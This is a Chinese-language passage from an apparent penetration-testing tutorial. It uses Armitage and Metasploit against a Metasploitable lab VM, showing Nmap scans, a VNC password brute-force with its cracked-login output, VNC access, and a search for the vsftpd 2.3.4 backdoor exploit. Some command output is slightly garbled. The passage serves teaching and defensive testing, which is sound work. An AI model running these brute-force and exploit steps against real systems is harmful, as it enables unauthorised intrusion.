

## 使用 Armitage 攻击

在我们对 IPS 发起攻击之前，我们需要找到一台我们拥有的漏洞机器，以便安全地运行测试，我们可以通过 Metasploitable 轻松地实现这一点！

## Metasploitable

Metasploitable 是一个虚拟 Unix 虚拟机，它被设计成存在漏洞，以便安全专家和爱好者（如你）将其作为测试的乐场。

它非常易于使用；事实上，你只需要下载虚拟机，将其加载到你的虚拟机管理器（如 VirtualBox）中，就可以开始了。镜像可以从这里下载：https://sourceforge.net/projects/metasploitable。

现在，让我们进行扫描，看看在这台 Metasploitable 机器上可以发现哪些漏洞。为此，进入 Host | Nmap Scans | Intense Scan | all TCP ports。

然后，选择一个 IP 范围；我使用了 192.168.1.0/24。

> 注意：你可以在屏幕底部的控制台（我们之前讨论过的 Console 标签页旁边）实时查看扫描结果，以收集有关扫描的额外信息。

例如，下图显示了对 Windows 7 机器进行扫描的输出。注意扫描是如何收集到计算机名称、操作系统和服务包信息等重要数据的：

| Console X | nmap X |
|---|---|
| [*] Nmap: | \001\ADBROWSE_0021 Tags: <group><active> |
| [*] Nmap: | smb-os-discovery |
| [*] Nmap: | OS Windows/Professional 7601 Service Pack 1 (Windows 7 Professional 0.1) |
| [*] Nmap: | OS Class: windows-7:professional |
| [*] Nmap: | Computer name: CESAR-PC |
| [*] Nmap: | NetBIOS-10 computer name: CESAR-PC\000 |
| [*] Nmap: | Workgroup: WORKGROUP\0 |
| [*] Nmap: | System time: 2021-08-05T20:24:55:01 |
| [*] Nmap: | smb-security-mode: |
| [*] Nmap: | account_used: <blank> |
| [*] Nmap: | authentication_level: user |
| [*] Nmap: | challenge_response: supported |
| [*] Nmap: | message_signing: disabled (dangerous, but default) |

图 15.8 - Nmap 扫描输出

## 利用渗透测试进行防御安全

现在，回到我们的扫描，你会注意到这次扫描可能需要几分钟时间（取决于设备数量），但一旦完成，它将向你显示一个弹出消息，如图所示：

![](img/8c6a223c57e25ea0cc1593903a1b920f_436_0.png)

图 15.9 – 强化扫描成功完成

现在，你将看到扫描中发现的所有系统或设备。在我们的案例中，Metasploitable 机器被识别为 IP 192.168.1.224，如图所示，它添加了一个 Linux 图标，因为这台机器被识别为 Linux 计算机：

![](img/8c6a223c57e25ea0cc1593903a1b920f_436_1.png)

图 15.10 – 扫描期间发现的机器

所以，让我们右键点击查看对每台机器执行什么类型的攻击。在我们的示例中，我们可以看到扫描发现了几个可以被利用来获取系统的服务，如图所示：

## 了解你敌人最好的朋友 – Metasploit

![](img/8c6a223c57e25ea0cc1593903a1b920f_437_0.png)

图 15.11 – 已启用的登录服务列表

现在，让我们看看是否可以使用 VNC 登录。为此，我们需要进入屏幕左侧的模块，导航到 auxiliary/scanner/vnc/vnc_login，双击打开它。然后 Launch（启动）并等待下方命令视图的输出。

惊喜吧，系统能够破解了 VNC 密码，如图所示：

![](img/8c6a223c57e25ea0cc1593903a1b920f_437_1.png)

```
scanner/vnc_login X
msf0 > use auxiliary(scanner/vnc/vnc_login)
msf0 > set DB_ALL_USERS false
DO ALL_USERS => false
msf0 > auxiliary(scanner/vnc/vnc_login) > set THREADS 24
THREADS => ><
msf0 > auxiliary(scanner/vnc/vnc_login) > run -j
BRUTEFORCE_SPEED => 5
DO_ALL_CREDS => false
STOP_ON_SUCCESS => false
HOSTS => 192.168.1.224
USER_AS => false
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/vnc_passwords.txt
USERNAME => admin
DO_ALL_PASS => false
REPORT => 5900
VERBOSE => true
* Auxiliary running as background job 3.
[*] 192.168.1.224:5900 - 192.168.1.224:5900 - Starting VNC sweep
[*] 192.168.1.224:5900 - No active DB - Credential data will not be saved
[*] 192.168.1.224:5900 - Login: password
[*] 192.168.1.224:5900 - Scanned 1 hosts (complete)
```

图 15.12 – 破解 VNC 密码

## 渗透防御

现在，我们可以打开终端测试是否可以使用密码登录 VNC。为此，只需打开终端（在你的情况下，将以下 IP 替换为你的 Metasploitable 机器 IP）：

```
vncviewer 192.168.1.224:5900
```

然后，输入密码。在这种情况下，输入密码并按回车。现在你将完全访问目标机器，如图所示：

![](img/8c6a223c57e25ea0cc1593903a1b920f_438_0) 通过 VNC 远程访问目标

这只是一个快速示例，显示攻击者如何进入一个不受保护的系统，或者关于一个不再支持、缺少更新或安全补丁的系统。然而，使用 Armitage 有更多选项，例如：

- 收集系统上运行的服务信息，包括版本，甚至进行暴力破解。
- 收集 FTP 版本信息，使用匿名登录和暴力破解。
- 根据目标系统的操作系统执行漏洞。
- 选择载荷（payloads）并发送更多。

现在是时候回到 Metasploit 并玩一下这个工具了。

## 执行 Metasploit

在 Metasploit 中，没有像 Armitage 那样的图形界面。在这里，你需要通过纯命令执行模块、攻击和载荷。但不要担心，让我们做一个示例，看看使用 Metasploit Framework 进行服务器攻击有多简单。在这个示例中，我们将使用漏洞的 Metasploitable 机器，目标将是尝试攻击 FTP 服务器。

所以，第一步再次运行 Metasploit：

```
sudo msfconsole
```

现在，搜索 ftp 以找到攻击 FTP 服务器的模块：

```
search ftp
```

遗憾的是，查询显示了 170 多个结果，我们需要找到一种方法来缩小列表以找到最佳攻击模块。一种方法是确定系统上运行的 FTP 服务器版本，以便我们可以搜索与特定版本相关的模块。为此，让我们使用老朋友 Nmap（已预安装在 Kali Linux 上）。现在，nmap 扫描将告诉我们运行的服务端口，但如果我们也想查看这些服务的版本，我们需要使用 -sV 参数，如下：

```
nmap -sV 192.168.1.224
```

然后，你应该看到像如下所示的结果：

```
kali@kali~$ nmap -sV 192.168.1.224
Starting Nmap 7.91 (https://nmap.org ) at 2021-08-06 01:27 EDT
map scan report for 192.168.1.224
Host is up (0ms latency).
Not shown: 977 closed ports
PORT   STATE SERVICE VERSION
21/tcp open ftp             vsftp 2.3.4
22/tcp open ssh               OpenSSL 4.7.p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp open telnet          Linux telnetd
25/tcp open smtp            Postfix smtpd
53/tcp open domain         ISC BIND 9.4.2
80/tcp open http            Apache httpd 2.2.8 ((Ubuntu) DAV/2)
```

图 15.14 - 使用 Nmap 收集 FTP 服务器版本

现在，让我们回到 Metasploit 对 vsftpd 进行搜索：

## search vsftpd

太棒了，搜索找到了针对 FTP 服务器的漏洞，如图所示：

```
msf > search vsftpd
Matching Modules
# Name                             Disclosure Date Rank       Check Description
0 exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03      excellent No       vsftpd v2.3.4 Backdoor Command Execution
```

通过名称或索引与模块交互。例如，执行 info 0，使用 8 use exploit/ftp/vsftpd_234_backdoor

图 15.15 - Metasploit 中的 vsftpd 漏洞

现在，让我们使用 info 命令收集有关该模块的额外信息：

# info 0

在图中，我们看到了许多有用信息，例如漏洞名称、平台、发布日期和作者，但对我们来说最重要的部分是 Basic options 部分，它告诉我们执行漏洞时可以使用的参数，在这种情况下，RHOST 未设置，而 RPORT 默认已设置为 21：

